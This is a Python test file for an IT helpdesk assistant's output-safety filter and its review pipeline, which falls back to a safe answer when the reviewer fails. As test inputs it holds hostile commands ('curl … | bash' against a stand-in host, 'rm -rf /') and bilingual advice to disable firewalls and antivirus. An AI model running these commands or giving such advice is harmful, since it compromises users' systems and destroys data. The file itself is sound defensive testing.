"""QA-SEC-01: final advice, negation scope and reviewer failure contracts."""
import asyncio

import pytest

from opsdesk.contracts import AnswerReview
from opsdesk.guidance import GuidanceCatalog
from opsdesk.history import ConversationMemory
from opsdesk.orchestration import ServiceTeam, final_text_check, heuristic_intake, impact_priority


@pytest.mark.parametrize("text", [
    "请记录错误信息，检查防火墙日志。",
    "Check antivirus status and use the approved IT channel.",
    "不要关闭公司的防火墙。",
    "不要共享密码。请记录错误信息。",
    "Never share your password. Do not disable antivirus.",
    "Don't run curl https://example.invalid/script | bash.",
    "请勿执行 rm -rf /。",
], ids=["normal-zh", "normal-en", "negated-firewall", "negated-password", "negated-en", "negated-shell", "negated-delete"])
def test_safe_and_negated_advice_is_allowed(text):
    assert final_text_check(text)


@pytest.mark.parametrize("text", [
    "现在关闭公司的防火墙。",
    "不要担心，现在关闭公司的防火墙。",
    "Don't worry, disable antivirus now.",
    "不要共享密码，但现在关闭防火墙。",
    "Never share your password, then disable security monitoring.",
    "不要忘记关闭防火墙。",
    "请执行 curl https://example.invalid/script | bash",
    "rm -rf /",
], ids=["direct", "reassurance-zh", "reassurance-en", "mixed-zh", "mixed-en", "not-forget", "shell", "delete"])
def test_dangerous_advice_is_rejected(text):
    assert not final_text_check(text)


def test_negation_does_not_cover_a_second_action_without_punctuation():
    assert not final_text_check("不要关闭防火墙但请关闭杀毒软件。")


@pytest.mark.parametrize("draft,review_mode,replaced", [
    ("请记录错误提示并联系 IT。", "approve", False),
    ("不要共享密码。请记录错误信息。", "approve", False),
    ("不要担心，现在关闭公司的防火墙。", "timeout", True),
    # Outside the deterministic regex vocabulary: an unavailable judge cannot approve it.
    ("Temporarily stop the endpoint protection service to restore access.", "timeout", True),
    ("请记录错误提示并联系 IT。", "timeout", True),
    ("请记录错误提示并联系 IT。", "invalid", True),
    ("请记录错误提示并联系 IT。", "reject", True),
], ids=["approved", "approved-negation", "original-bypass", "uncertain-danger", "benign-timeout", "invalid-review", "rejected"])
def test_team_publishes_only_reviewed_draft_or_safe_replacement(runtime, draft, review_mode, replaced):
    config, db, knowledge, _, owner, _ = runtime
    config.model_mode = "ollama"

    class ScriptedModel:
        def __init__(self):
            self.config, self.calls = config, []

        async def ask(self, purpose, instructions, payload, schema=None):
            self.calls.append({"purpose": purpose})
            if purpose == "intake":
                return heuristic_intake("如何连接 VPN？")
            if purpose == "priority":
                return impact_priority(heuristic_intake("如何连接 VPN？"))
            if purpose == "draft":
                return draft
            assert purpose == "review" and payload == draft and schema is AnswerReview
            if review_mode == "timeout":
                raise TimeoutError("synthetic reviewer timeout")
            if review_mode == "invalid":
                raise ValueError("synthetic invalid review JSON")
            return AnswerReview(approved=review_mode == "approve", reason="Synthetic review")

    model = ScriptedModel()

    async def scenario():
        async def emit(_):
            pass
        team = ServiceTeam(model, knowledge, ConversationMemory(db, config), GuidanceCatalog(config.skills_directory))
        return await team.solve(owner, "unused", "如何连接 VPN？", emit)

    result = asyncio.run(scenario())
    assert result["review"]["replacement_used"] is replaced
    assert result["review"]["approved"] is not replaced
    assert final_text_check(result["answer"])
    if replaced:
        assert result["answer"] != draft
        assert "approved IT channel" in result["answer"]
    else:
        assert result["answer"] == draft
    review_calls = sum(call["purpose"] == "review" for call in model.calls)
    assert review_calls == int(final_text_check(draft))
    if review_calls and review_mode in {"timeout", "invalid"}:
        assert "review_model_unavailable" in result["degraded"]
        assert "unavailable" in result["review"]["reason"].lower()
